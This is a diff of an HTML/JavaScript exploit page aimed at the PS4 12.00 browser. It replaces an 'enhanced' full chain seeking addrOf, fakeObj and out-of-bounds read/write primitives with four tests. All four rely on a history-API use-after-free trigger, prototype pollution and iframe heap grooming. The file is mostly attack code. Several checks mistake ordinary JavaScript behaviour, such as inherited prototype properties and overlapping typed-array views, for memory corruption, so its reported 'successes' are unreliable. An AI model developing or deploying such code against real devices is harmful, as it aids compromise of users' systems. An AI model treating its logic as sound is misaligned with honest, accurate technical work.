@@ -2,13 +2,16 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - Enhanced Exploit 3 with Primitives</title>
+<title>PS4 12.00 - Native Structure Corruption</title>
 </head>
 <body>
-<h2>PS4 12.00 - Full Chain + Weaponized Primitives</h2>
+<h2>PS4 12.00 - UAF Native Structure Corruption</h2>
 <p>Status: <span id="status">Ready</span></p>
 
-<button onclick="runEnhancedExploit3()">RUN - Enhanced Full Chain with Primitives</button>
+<button onclick="testArrayStorageCorruption()">TEST 1 - Array Storage Corruption</button>
+<button onclick="testBufferViewConfusion()">TEST 2 - ArrayBuffer View Confusion</button>
+<button onclick="testButterflyManipulation()">TEST 3 - Butterfly Pointer Manipulation</button>
+<button onclick="testJSCellCorruption()">TEST 4 - JSCell Header Corruption</button>
 
 <pre id="log"></pre>
 
@@ -24,245 +27,114 @@ function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
 
 var keepAlive = [];
 
-// UAF constants - NAO MODIFICAR
 const BASE = 977;
 const STEP = 14461;
 const UAF_ITERS = 48;
 
 // =====================================================
-// ENHANCED EXPLOIT 3 - Full Chain with Primitives
+// TEST 1 - Array Storage Corruption
 // =====================================================
-async function runEnhancedExploit3(){
+async function testArrayStorageCorruption(){
   logEl.textContent = "";
   keepAlive = [];
-  statusEl.textContent = "Running Enhanced Exploit...";
+  statusEl.textContent = "Test 1 Running...";
   
-  log("=== ENHANCED EXPLOIT 3: Full Chain + Weaponized Primitives ===\n");
-  log("Goal: Combine all primitives + test addrOf/fakeObj/R/W in UAF context\n");
+  log("=== TEST 1: Array Storage Corruption ===\n");
+  log("Strategy: Corrupt ArrayStorage during UAF to bypass bounds check\n");
   
-  // Setup pollution
-  log("[SETUP] Setting up pollution");
+  log("[SETUP] Creating victim arrays");
   
-  Array.prototype.fakeStructureID = 0x11223344;
-  Array.prototype.fakeButterfly = 0x55667788;
-  Array.prototype.fakeLength = 0x1000;
-  
-  // Additional pollution for primitives
-  ArrayBuffer.prototype.fakeBackingStore = 0x4142434445464748;
-  Uint32Array.prototype.fakeByteLength = 0x100000;
-  
-  log("  Pollution active\n");
-  
-  // Target objects for address leak
-  let targetA = { marker: 0xCAFEBABE, data: new Uint32Array(16) };
-  let targetB = { marker: 0xDEADBEEF, data: new Uint32Array(16) };
-  
-  // ArrayBuffer for R/W primitives
-  let rwBuffer = new ArrayBuffer(256);
-  let rwView = new Uint32Array(rwBuffer);
-  for(let i=0; i<64; i++) {
-    rwView[i] = 0xAAAA0000 + i;
+  let victimArray = [1, 2, 3, 4, 5];
+  let sprayArrays = [];
+  for(let i=0; i<100; i++) {
+    sprayArrays.push([0x1000 + i, 0x2000 + i, 0x3000 + i]);
   }
   
-  keepAlive.push(targetA, targetB, rwBuffer);
+  keepAlive.push(victimArray, ...sprayArrays);
   
-  log("[TARGETS] Objects for primitives:");
-  log("  targetA: 0xCAFEBABE");
-  log("  targetB: 0xDEADBEEF");
-  log("  rwBuffer: 256 bytes\n");
+  log("  Victim array: 5 elements");
+  log("  Spray arrays: 100 x 3 elements\n");
   
-  let getterFired = 0;
-  let allocatedObjects = [];
-  let leakedAddresses = [];
-  let oobReads = [];
-  let oobWrites = [];
+  Array.prototype.fakeLength = 0x1000;
+  Array.prototype.fakeVectorLength = 0x2000;
   
-  log("[PHASE 1] Full UAF chain with primitives");
-  
+  let corruptionDetected = false;
+  let leakedData = [];
   let size = BASE;
+  
+  log("[PHASE 1] UAF with array storage corruption");
   
   for(let i=0; i<UAF_ITERS; i++){
     let state = {
       index: i,
-      data: [0x41, 0x42, 0x43, 0x44],
-      targets: [targetA, targetB],
-      rwBuf: [rwBuffer],
+      victim: victimArray,
+      spray: sprayArrays.slice(0, 10),
       
-      get exploit() {
-        getterFired++;
-        
-        if(i >= 45) { // Critical window
-          log(`  OK CRITICAL GETTER at ITER ${i}`);
-          log(`    history.length: ${history.length}`);
-          log(`    Pollution active: ${this.data.fakeStructureID === 0x11223344}`);
+      get corrupt() {
+        if(i >= 45) {
+          log(`  OK ITER ${i}`);
           
-          // ============================================
-          // PRIMITIVE 1: addrOf - Address Leak
-          // ============================================
           try {
-            let realLen = this.targets.length; // Should be 2
-            let fakeLen = this.targets.fakeLength; // Should be 0x1000
-            
-            if(fakeLen && fakeLen > realLen) {
-              log(`\n    [PRIMITIVE 1: addrOf]`);
-              log(`    Real length: ${realLen}, Fake: 0x${fakeLen.toString(16)}`);
-              
-              // Try OOB read on targets array
-              for(let j=realLen; j<Math.min(realLen+10, fakeLen); j++) {
-                let val = this.targets[j];
-                if(val !== undefined) {
-                  if(typeof val === 'number' && val > 0x1000) {
-                    log(`    OOB[${j}] = 0x${val.toString(16)} OK LEAKED ADDRESS`);
-                    leakedAddresses.push(val);
-                  } else if(typeof val === 'object' && val !== null) {
-                    log(`    OOB[${j}] = [object] OK LEAKED OBJECT`);
-                    leakedAddresses.push('object');
-                  }
-                }
+            // During UAF, try to reallocate freed memory with controlled data
+            let reallocArrays = [];
+            for(let j=0; j<50; j++) {
+              let arr = new Array(8);
+              for(let k=0; k<8; k++) {
+                arr[k] = 0xBEEF0000 + (j * 8 + k);
               }
-            }
-          } catch(e) {
-            log(`    addrOf exception: ${e.message}`);
-          }
-          
-          // ============================================
-          // PRIMITIVE 2: fakeObj - Type Confusion
-          // ============================================
-          try {
-            log(`\n    [PRIMITIVE 2: fakeObj]`);
-            
-            let intVal = this.data[0]; // Should be 0x41
-            log(`    data[0] = 0x${intVal.toString(16)}`);
-            
-            // Check if integer inherited object properties
-            if(intVal.fakeStructureID !== undefined) {
-              log(`    OK Integer has fakeStructureID: 0x${intVal.fakeStructureID.toString(16)}`);
+              reallocArrays.push(arr);
             }
             
-            // Check array confusion
-            if(this.data.fakeStructureID) {
-              log(`    OK Array fakeStructureID: 0x${this.data.fakeStructureID.toString(16)}`);
-            }
+            log(`    Allocated 50 arrays during UAF window`);
             
-            // Check length confusion
-            let realArrLen = 4;
-            let fakeArrLen = this.data.fakeLength;
-            if(fakeArrLen && fakeArrLen !== realArrLen) {
-              log(`    OK Length confusion: real=${realArrLen}, fake=0x${fakeArrLen.toString(16)}`);
-            }
-          } catch(e) {
-            log(`    fakeObj exception: ${e.message}`);
-          }
-          
-          // ============================================
-          // PRIMITIVE 3: Arbitrary Read
-          // ============================================
-          try {
-            log(`\n    [PRIMITIVE 3: Arbitrary Read]`);
+            // Check if victim array was corrupted
+            let victimLen = this.victim.length;
+            log(`    Victim length: ${victimLen} (real: 5, fake: 0x1000)`);
             
-            let buf = this.rwBuf[0];
-            let view = new Uint32Array(buf);
-            
-            let realBufLen = view.length; // 64
-            let fakeBufLen = view.fakeByteLength;
-            
-            if(fakeBufLen) {
-              log(`    Real: ${realBufLen} elements, Fake: 0x${fakeBufLen.toString(16)} bytes`);
-            }
-            
-            if(buf.fakeBackingStore) {
-              log(`    fakeBackingStore: 0x${buf.fakeBackingStore.toString(16)}`);
-            }
-            
-            // Try OOB read
-            for(let j=realBufLen; j<Math.min(realBufLen+10, 1024); j++) {
-              let val = view[j];
-              if(val !== undefined && val !== 0) {
-                log(`    OOB_READ[${j}] = 0x${val.toString(16)}`);
-                oobReads.push({idx: j, val: val});
+            // Try to read beyond original bounds
+            for(let j=5; j<20; j++) {
+              let val = this.victim[j];
+              if(val !== undefined) {
+                log(`    OK victim[${j}] = 0x${val.toString(16)}`);
+                leakedData.push({idx: j, val: val});
+                corruptionDetected = true;
               }
             }
             
-            // Verify pattern integrity
-            let patternOK = (view[0] === 0xAAAA0000 && view[10] === 0xAAAA000A);
-            if(patternOK) {
-              log(`    OK Pattern intact in valid range`);
-            }
-            
-          } catch(e) {
-            log(`    Read exception: ${e.message}`);
-          }
-          
-          // ============================================
-          // PRIMITIVE 4: Arbitrary Write
-          // ============================================
-          try {
-            log(`\n    [PRIMITIVE 4: Arbitrary Write]`);
-            
-            let buf = this.rwBuf[0];
-            let view = new Uint32Array(buf);
-            let realBufLen = view.length;
-            
-            // Try OOB write
-            for(let j=realBufLen; j<Math.min(realBufLen+5, 1024); j++) {
-              view[j] = 0xBEEF0000 + j;
-              
-              // Verify
-              let readBack = view[j];
-              if(readBack === 0xBEEF0000 + j) {
-                log(`    OOB_WRITE[${j}] = 0x${(0xBEEF0000 + j).toString(16)} OK VERIFIED`);
-                oobWrites.push({idx: j, val: 0xBEEF0000 + j});
+            // Check spray arrays for corruption
+            for(let arr of this.spray) {
+              if(arr.length !== 3 || arr[0] < 0x1000 || arr[0] > 0x1100) {
+                log(`    OK Spray array corrupted: length=${arr.length}, [0]=0x${arr[0].toString(16)}`);
+                corruptionDetected = true;
               }
             }
             
+            keepAlive.push(...reallocArrays);
+            
           } catch(e) {
-            log(`    Write exception: ${e.message}`);
-          }
-          
-          // ============================================
-          // Original Exploit 3 allocations
-          // ============================================
-          for(let j=0; j<100; j++) {
-            let fakeObj = {
-              vtable: 0xAABBCCDD,
-              data: new ArrayBuffer(128),
-              index: i * 100 + j
-            };
-            allocatedObjects.push(fakeObj);
-          }
-          
-          log(`\n    Allocated 100 fake objects`);
-          
-          if(this.data.fakeStructureID) {
-            log(`    fakeStructureID: 0x${this.data.fakeStructureID.toString(16)}`);
+            log(`    Exception: ${e.message}`);
           }
         }
-        
-        return "EXPLOIT_" + i;
+        return "corrupt_" + i;
       }
     };
     
-    let frag = "E".repeat(size);
+    let frag = "C".repeat(size);
     
     history.pushState(state, "", "#" + frag);
     history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
     
     if(i % 6 === 0) setTimeout(()=>history.back(), 0);
-    
-    if(i % 10 === 0) {
-      log(`  ITER ${i}: size=${size}`);
-    }
+    if(i % 10 === 0) log(`  ITER ${i}: size=${size}`);
     
     size += STEP;
     await sleep(5);
   }
   
-  log(`\n  UAF complete, getter fired ${getterFired} times\n`);
-  
+  log("\n[PHASE 2] UAF complete\n");
   await sleep(120);
   
-  // Heap grooming
-  log("[PHASE 2] Heap grooming");
+  log("[PHASE 3] Heap grooming");
   let frames = [];
   for(let i=0; i<80; i++){
     let f = document.createElement("iframe");
@@ -276,150 +148,497 @@ async function runEnhancedExploit3(){
     frames.push(f);
   }
   frames.forEach(f=>f.remove());
-  
   await sleep(80);
   
-  // =====================================================
-  // RESULTS ANALYSIS
-  // =====================================================
-  log("\n[PHASE 3] Primitives Results");
+  log("\n[RESULTS]");
+  log(`Leaked data points: ${leakedData.length}`);
   
-  log("\n--- PRIMITIVE 1: addrOf ---");
-  log(`Leaked addresses: ${leakedAddresses.length}`);
-  if(leakedAddresses.length > 0) {
-    for(let i=0; i<Math.min(5, leakedAddresses.length); i++) {
-      if(typeof leakedAddresses[i] === 'number') {
-        log(`  [${i}] 0x${leakedAddresses[i].toString(16)}`);
-      } else {
-        log(`  [${i}] ${leakedAddresses[i]}`);
-      }
+  if(leakedData.length > 0) {
+    log("\nOK Leaked data:");
+    for(let d of leakedData.slice(0, 10)) {
+      log(`  [${d.idx}] = 0x${d.val.toString(16)}`);
     }
-    log("OK addrOf primitive working");
+    log("\nOK OK Array storage corruption successful");
+    statusEl.textContent = "TEST 1 SUCCESS";
+  } else if(corruptionDetected) {
+    log("\nOK Corruption detected but no data leaked");
+    statusEl.textContent = "TEST 1 PARTIAL";
   } else {
-    log("FAIL No addresses leaked");
+    log("\nFAIL No corruption detected");
+    statusEl.textContent = "TEST 1 FAILED";
   }
   
-  log("\n--- PRIMITIVE 2: fakeObj ---");
-  if(history.state && history.state.data) {
-    let hasConfusion = (history.state.data.fakeStructureID === 0x11223344);
-    if(hasConfusion) {
-      log("OK Type confusion active");
-      log(`  fakeStructureID: 0x${history.state.data.fakeStructureID.toString(16)}`);
-      log(`  fakeLength: 0x${history.state.data.fakeLength.toString(16)}`);
-    } else {
-      log("FAIL Type confusion not detected");
-    }
-  }
-  
-  log("\n--- PRIMITIVE 3: Arbitrary Read ---");
-  log(`OOB reads: ${oobReads.length}`);
-  if(oobReads.length > 0) {
-    for(let r of oobReads.slice(0, 5)) {
-      log(`  [${r.idx}] = 0x${r.val.toString(16)}`);
-    }
-    log("OK Arbitrary read working");
-  } else {
-    log("FAIL No OOB reads");
-  }
-  
-  log("\n--- PRIMITIVE 4: Arbitrary Write ---");
-  log(`OOB writes: ${oobWrites.length}`);
-  if(oobWrites.length > 0) {
-    for(let w of oobWrites.slice(0, 5)) {
-      log(`  [${w.idx}] = 0x${w.val.toString(16)}`);
-    }
-    log("OK Arbitrary write working");
-  } else {
-    log("FAIL No OOB writes");
-  }
-  
-  // Verify combined primitives
-  log("\n[PHASE 4] Combined Primitives Check");
-  
-  log(`Allocated objects: ${allocatedObjects.length}`);
-  
-  let validFakes = 0;
-  for(let obj of allocatedObjects) {
-    if(obj.vtable === 0xAABBCCDD && obj.data) {
-      validFakes++;
-    }
-  }
-  
-  log(`Valid fake objects: ${validFakes}/${allocatedObjects.length}`);
-  
-  if(history.state && history.state.data) {
-    log("\nCurrent state pollution:");
-    log(`  fakeStructureID: 0x${(history.state.data.fakeStructureID || 0).toString(16)}`);
-    log(`  fakeButterfly: 0x${(history.state.data.fakeButterfly || 0).toString(16)}`);
-    log(`  fakeLength: 0x${(history.state.data.fakeLength || 0).toString(16)}`);
-  }
-  
-  // Navigate and check
-  log("\n[PHASE 5] Navigate through states");
-  
-  for(let i=0; i<5; i++) {
-    history.back();
-    await sleep(50);
-    
-    if(history.state && history.state.data) {
-      let struct = history.state.data.fakeStructureID || 0;
-      log(`  Back ${i}: index=${history.state.index}, struct=0x${struct.toString(16)}`);
-      
-      try {
-        let len = history.state.data.length;
-        let fakelen = history.state.data.fakeLength;
-        
-        if(fakelen && fakelen !== len) {
-          log(`    Length mismatch: real=${len}, fake=0x${fakelen.toString(16)}`);
-          log(`    OK TYPE CONFUSION DETECTED`);
-        }
-      } catch(e) {}
-    }
-  }
-  
-  // Cleanup
-  delete Array.prototype.fakeStructureID;
-  delete Array.prototype.fakeButterfly;
   delete Array.prototype.fakeLength;
-  delete ArrayBuffer.prototype.fakeBackingStore;
-  delete Uint32Array.prototype.fakeByteLength;
-  
-  log("\n=== EXPLOIT 3 END ===");
-  
-  // Final summary
-  let primitivesWorking = 0;
-  if(leakedAddresses.length > 0) primitivesWorking++;
-  if(history.state && history.state.data.fakeStructureID) primitivesWorking++;
-  if(oobReads.length > 0) primitivesWorking++;
-  if(oobWrites.length > 0) primitivesWorking++;
-  
-  if(primitivesWorking >= 2 && validFakes > 0) {
-    log("\nOK OK OK FULL CHAIN SUCCESS OK OK OK");
-    log("OK Pollution active through UAF");
-    log("OK Getter executed in critical window");
-    log("OK Fake objects allocated");
-    log("OK Type confusion confirmed");
-    log(`OK ${primitivesWorking}/4 primitives working`);
-    statusEl.textContent = "FULL CHAIN SUCCESS";
-  } else {
-    log(`\n${primitivesWorking}/4 primitives working`);
-    log("Partial success - primitives need refinement");
-    statusEl.textContent = `${primitivesWorking}/4 PRIMITIVES`;
-  }
+  delete Array.prototype.fakeVectorLength;
+  log("\n=== TEST 1 END ===");
 }
 
-log("PS4 12.00 - Enhanced Full Chain");
-log("\nBased on proven Exploit 3 with added primitives:");
-log("OK Original UAF trigger (977/14461/48)");
-log("OK Prototype pollution");
-log("OK Reentrant getters");
-log("OK Heap grooming");
-log("\nNew weaponized primitives:");
-log("1. addrOf - Address leak");
-log("2. fakeObj - Type confusion");
-log("3. Arbitrary Read - OOB read");
-log("4. Arbitrary Write - OOB write");
-log("\nClick button to run enhanced exploit");
+// =====================================================
+// TEST 2 - ArrayBuffer View Confusion
+// =====================================================
+async function testBufferViewConfusion(){
+  logEl.textContent = "";
+  keepAlive = [];
+  statusEl.textContent = "Test 2 Running...";
+  
+  log("=== TEST 2: ArrayBuffer View Confusion ===\n");
+  log("Strategy: Create overlapping views to confuse bounds checking\n");
+  
+  log("[SETUP] Creating buffer with multiple views");
+  
+  let sharedBuffer = new ArrayBuffer(256);
+  let view32 = new Uint32Array(sharedBuffer);
+  let view8 = new Uint8Array(sharedBuffer);
+  let viewFloat = new Float64Array(sharedBuffer);
+  
+  for(let i=0; i<64; i++) {
+    view32[i] = 0xDEAD0000 + i;
+  }
+  
+  keepAlive.push(sharedBuffer, view32, view8, viewFloat);
+  
+  log("  Shared buffer: 256 bytes");
+  log("  Views: Uint32, Uint8, Float64\n");
+  
+  Uint32Array.prototype.fakeByteLength = 0x100000;
+  Uint8Array.prototype.fakeByteLength = 0x100000;
+  
+  let confusionAchieved = false;
+  let oobData = [];
+  let size = BASE;
+  
+  log("[PHASE 1] UAF with view confusion");
+  
+  for(let i=0; i<UAF_ITERS; i++){
+    let state = {
+      index: i,
+      buf: sharedBuffer,
+      v32: view32,
+      v8: view8,
+      vf: viewFloat,
+      
+      get confuse() {
+        if(i >= 45) {
+          log(`  OK ITER ${i}`);
+          
+          try {
+            // Use different views to access same memory
+            log(`    view32.length: ${this.v32.length}`);
+            log(`    view8.length: ${this.v8.length}`);
+            log(`    viewFloat.length: ${this.vf.length}`);
+            
+            // Check fake lengths
+            if(this.v32.fakeByteLength) {
+              log(`    view32.fakeByteLength: 0x${this.v32.fakeByteLength.toString(16)}`);
+            }
+            
+            // Try type confusion between views
+            // Write as Uint32, read as Float64
+            this.v32[0] = 0x41424344;
+            this.v32[1] = 0x45464748;
+            
+            let floatVal = this.vf[0];
+            log(`    Type confusion: u32[0,1] as float64 = ${floatVal}`);
+            
+            if(floatVal !== 0) {
+              confusionAchieved = true;
+            }
+            
+            // Try OOB on view8 (larger bounds)
+            for(let j=256; j<280; j++) {
+              let val = this.v8[j];
+              if(val !== undefined && val !== 0) {
+                log(`    OK view8[${j}] = 0x${val.toString(16)}`);
+                oobData.push({idx: j, val: val});
+              }
+            }
+            
+            // Try OOB on view32
+            for(let j=64; j<80; j++) {
+              let val = this.v32[j];
+              if(val !== undefined && val !== 0) {
+                log(`    OK view32[${j}] = 0x${val.toString(16)}`);
+                oobData.push({idx: j, val: val});
+              }
+            }
+            
+          } catch(e) {
+            log(`    Exception: ${e.message}`);
+          }
+        }
+        return "confuse_" + i;
+      }
+    };
+    
+    let frag = "V".repeat(size);
+    
+    history.pushState(state, "", "#" + frag);
+    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
+    
+    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
+    if(i % 10 === 0) log(`  ITER ${i}: size=${size}`);
+    
+    size += STEP;
+    await sleep(5);
+  }
+  
+  log("\n[PHASE 2] UAF complete\n");
+  await sleep(120);
+  
+  log("[PHASE 3] Heap grooming");
+  let frames = [];
+  for(let i=0; i<80; i++){
+    let f = document.createElement("iframe");
+    document.body.appendChild(f);
+    try {
+      let d = f.contentDocument;
+      d.open();
+      d.write("<html><body>G</body></html>");
+      d.close();
+    } catch(e){}
+    frames.push(f);
+  }
+  frames.forEach(f=>f.remove());
+  await sleep(80);
+  
+  log("\n[RESULTS]");
+  log(`Type confusion: ${confusionAchieved}`);
+  log(`OOB data points: ${oobData.length}`);
+  
+  if(oobData.length > 0) {
+    log("\nOK OOB data:");
+    for(let d of oobData.slice(0, 10)) {
+      log(`  [${d.idx}] = 0x${d.val.toString(16)}`);
+    }
+    log("\nOK OK View confusion successful");
+    statusEl.textContent = "TEST 2 SUCCESS";
+  } else if(confusionAchieved) {
+    log("\nOK Type confusion working but no OOB");
+    statusEl.textContent = "TEST 2 PARTIAL";
+  } else {
+    log("\nFAIL No confusion achieved");
+    statusEl.textContent = "TEST 2 FAILED";
+  }
+  
+  delete Uint32Array.prototype.fakeByteLength;
+  delete Uint8Array.prototype.fakeByteLength;
+  log("\n=== TEST 2 END ===");
+}
+
+// =====================================================
+// TEST 3 - Butterfly Pointer Manipulation
+// =====================================================
+async function testButterflyManipulation(){
+  logEl.textContent = "";
+  keepAlive = [];
+  statusEl.textContent = "Test 3 Running...";
+  
+  log("=== TEST 3: Butterfly Pointer Manipulation ===\n");
+  log("Strategy: Corrupt butterfly pointer to redirect array storage\n");
+  
+  log("[SETUP] Creating arrays with controlled layout");
+  
+  let targetArray = [0xAAAA, 0xBBBB, 0xCCCC, 0xDDDD];
+  let helperArrays = [];
+  
+  for(let i=0; i<50; i++) {
+    let arr = new Array(16);
+    for(let j=0; j<16; j++) {
+      arr[j] = 0x1000 * i + j;
+    }
+    helperArrays.push(arr);
+  }
+  
+  keepAlive.push(targetArray, ...helperArrays);
+  
+  log("  Target array: 4 elements");
+  log("  Helper arrays: 50 x 16 elements\n");
+  
+  Array.prototype.fakeButterfly = 0x4142434445464748;
+  
+  let butterflyCorrupted = false;
+  let redirectedReads = [];
+  let size = BASE;
+  
+  log("[PHASE 1] UAF with butterfly corruption");
+  
+  for(let i=0; i<UAF_ITERS; i++){
+    let state = {
+      index: i,
+      target: targetArray,
+      helpers: helperArrays.slice(0, 10),
+      
+      get corrupt() {
+        if(i >= 46) {
+          log(`  OK ITER ${i}`);
+          
+          try {
+            // Check if butterfly pointer is accessible
+            if(this.target.fakeButterfly) {
+              log(`    OK target.fakeButterfly: 0x${this.target.fakeButterfly.toString(16)}`);
+              butterflyCorrupted = true;
+            }
+            
+            // Try to read from target (should follow butterfly)
+            log(`    target.length: ${this.target.length}`);
+            
+            for(let j=0; j<10; j++) {
+              let val = this.target[j];
+              if(val !== undefined) {
+                log(`    target[${j}] = 0x${val.toString(16)}`);
+                
+                // Check if we're reading from unexpected location
+                if(j >= 4 && (val < 0xAAAA || val > 0xDDDD)) {
+                  log(`    OK Redirected read detected`);
+                  redirectedReads.push({idx: j, val: val});
+                }
+              }
+            }
+            
+            // Check helper arrays for corruption
+            for(let k=0; k<this.helpers.length; k++) {
+              let helper = this.helpers[k];
+              if(helper.fakeButterfly) {
+                log(`    OK helper[${k}].fakeButterfly: 0x${helper.fakeButterfly.toString(16)}`);
+              }
+              
+              // Check for unexpected values
+              for(let j=0; j<5; j++) {
+                let expected = k * 0x1000 + j;
+                let actual = helper[j];
+                if(actual !== expected && actual !== undefined) {
+                  log(`    OK helper[${k}][${j}] corrupted: 0x${actual.toString(16)}`);
+                  butterflyCorrupted = true;
+                }
+              }
+            }
+            
+          } catch(e) {
+            log(`    Exception: ${e.message}`);
+          }
+        }
+        return "butterfly_" + i;
+      }
+    };
+    
+    let frag = "B".repeat(size);
+    
+    history.pushState(state, "", "#" + frag);
+    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
+    
+    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
+    if(i % 10 === 0) log(`  ITER ${i}: size=${size}`);
+    
+    size += STEP;
+    await sleep(5);
+  }
+  
+  log("\n[PHASE 2] UAF complete\n");
+  await sleep(120);
+  
+  log("[PHASE 3] Heap grooming");
+  let frames = [];
+  for(let i=0; i<80; i++){
+    let f = document.createElement("iframe");
+    document.body.appendChild(f);
+    try {
+      let d = f.contentDocument;
+      d.open();
+      d.write("<html><body>G</body></html>");
+      d.close();
+    } catch(e){}
+    frames.push(f);
+  }
+  frames.forEach(f=>f.remove());
+  await sleep(80);
+  
+  log("\n[RESULTS]");
+  log(`Butterfly corruption: ${butterflyCorrupted}`);
+  log(`Redirected reads: ${redirectedReads.length}`);
+  
+  if(redirectedReads.length > 0) {
+    log("\nOK Redirected reads:");
+    for(let r of redirectedReads.slice(0, 10)) {
+      log(`  [${r.idx}] = 0x${r.val.toString(16)}`);
+    }
+    log("\nOK OK Butterfly manipulation successful");
+    statusEl.textContent = "TEST 3 SUCCESS";
+  } else if(butterflyCorrupted) {
+    log("\nOK Butterfly accessible but no redirects");
+    statusEl.textContent = "TEST 3 PARTIAL";
+  } else {
+    log("\nFAIL No butterfly corruption");
+    statusEl.textContent = "TEST 3 FAILED";
+  }
+  
+  delete Array.prototype.fakeButterfly;
+  log("\n=== TEST 3 END ===");
+}
+
+// =====================================================
+// TEST 4 - JSCell Header Corruption
+// =====================================================
+async function testJSCellCorruption(){
+  logEl.textContent = "";
+  keepAlive = [];
+  statusEl.textContent = "Test 4 Running...";
+  
+  log("=== TEST 4: JSCell Header Corruption ===\n");
+  log("Strategy: Corrupt JSCell metadata to confuse object type\n");
+  
+  log("[SETUP] Creating objects for JSCell corruption");
+  
+  let victimObj = {
+    type: "array",
+    data: [1, 2, 3, 4, 5],
+    marker: 0xCAFEBABE
+  };
+  
+  let victimBuf = new ArrayBuffer(128);
+  let victimView = new Uint32Array(victimBuf);
+  for(let i=0; i<32; i++) {
+    victimView[i] = 0xBEEF0000 + i;
+  }
+  
+  keepAlive.push(victimObj, victimBuf, victimView);
+  
+  log("  Victim object with array");
+  log("  Victim ArrayBuffer (128 bytes)\n");
+  
+  Object.prototype.fakeStructureID = 0x11223344;
+  Object.prototype.fakeIndexingType = 0x55;
+  Array.prototype.fakeStructureID = 0xAABBCCDD;
+  ArrayBuffer.prototype.fakeStructureID = 0xDEADBEEF;
+  
+  let jscellCorrupted = false;
+  let typeConfusion = [];
+  let size = BASE;
+  
+  log("[PHASE 1] UAF with JSCell corruption");
+  
+  for(let i=0; i<UAF_ITERS; i++){
+    let state = {
+      index: i,
+      obj: victimObj,
+      buf: victimBuf,
+      
+      get corrupt() {
+        if(i >= 47) {
+          log(`  OK ITER ${i}`);
+          
+          try {
+            // Check JSCell corruption on object
+            if(this.obj.fakeStructureID) {
+              log(`    OK obj.fakeStructureID: 0x${this.obj.fakeStructureID.toString(16)}`);
+              jscellCorrupted = true;
+            }
+            
+            if(this.obj.data.fakeStructureID) {
+              log(`    OK obj.data.fakeStructureID: 0x${this.obj.data.fakeStructureID.toString(16)}`);
+              jscellCorrupted = true;
+            }
+            
+            // Check ArrayBuffer JSCell
+            if(this.buf.fakeStructureID) {
+              log(`    OK buf.fakeStructureID: 0x${this.buf.fakeStructureID.toString(16)}`);
+              jscellCorrupted = true;
+            }
+            
+            // Try to access object as if it's a different type
+            try {
+              let objAsArray = Array.from(this.obj);
+              if(objAsArray.length > 0) {
+                log(`    OK Object treated as array: length=${objAsArray.length}`);
+                typeConfusion.push({type: 'obj_as_array', val: objAsArray});
+              }
+            } catch(e) {}
+            
+            // Try to treat ArrayBuffer as object
+            try {
+              let keys = Object.keys(this.buf);
+              if(keys.length > 2) {
+                log(`    OK ArrayBuffer has ${keys.length} properties`);
+                typeConfusion.push({type: 'buf_as_obj', val: keys.length});
+              }
+            } catch(e) {}
+            
+            // Check indexing type pollution
+            if(this.obj.fakeIndexingType) {
+              log(`    OK obj.fakeIndexingType: 0x${this.obj.fakeIndexingType.toString(16)}`);
+            }
+            
+          } catch(e) {
+            log(`    Exception: ${e.message}`);
+          }
+        }
+        return "jscell_" + i;
+      }
+    };
+    
+    let frag = "J".repeat(size);
+    
+    history.pushState(state, "", "#" + frag);
+    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
+    
+    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
+    if(i % 10 === 0) log(`  ITER ${i}: size=${size}`);
+    
+    size += STEP;
+    await sleep(5);
+  }
+  
+  log("\n[PHASE 2] UAF complete\n");
+  await sleep(120);
+  
+  log("[PHASE 3] Heap grooming");
+  let frames = [];
+  for(let i=0; i<80; i++){
+    let f = document.createElement("iframe");
+    document.body.appendChild(f);
+    try {
+      let d = f.contentDocument;
+      d.open();
+      d.write("<html><body>G</body></html>");
+      d.close();
+    } catch(e){}
+    frames.push(f);
+  }
+  frames.forEach(f=>f.remove());
+  await sleep(80);
+  
+  log("\n[RESULTS]");
+  log(`JSCell corruption: ${jscellCorrupted}`);
+  log(`Type confusions: ${typeConfusion.length}`);
+  
+  if(typeConfusion.length > 0) {
+    log("\nOK Type confusions:");
+    for(let t of typeConfusion) {
+      log(`  ${t.type}: ${JSON.stringify(t.val).substring(0, 50)}`);
+    }
+    log("\nOK OK JSCell corruption successful");
+    statusEl.textContent = "TEST 4 SUCCESS";
+  } else if(jscellCorrupted) {
+    log("\nOK JSCell fields accessible but no type confusion");
+    statusEl.textContent = "TEST 4 PARTIAL";
+  } else {
+    log("\nFAIL No JSCell corruption");
+    statusEl.textContent = "TEST 4 FAILED";
+  }
+  
+  delete Object.prototype.fakeStructureID;
+  delete Object.prototype.fakeIndexingType;
+  delete Array.prototype.fakeStructureID;
+  delete ArrayBuffer.prototype.fakeStructureID;
+  log("\n=== TEST 4 END ===");
+}
+
+log("PS4 12.00 - Native Structure Corruption Tests");
+log("\n4 separate tests targeting different corruption vectors:");
+log("\n1. Array Storage - Corrupt ArrayStorage header");
+log("2. View Confusion - Overlap typed array views");
+log("3. Butterfly - Redirect butterfly pointer");
+log("4. JSCell - Corrupt JSCell metadata");
+log("\nRun each test individually to identify working vector");
 </script>
 </body>
 </html>
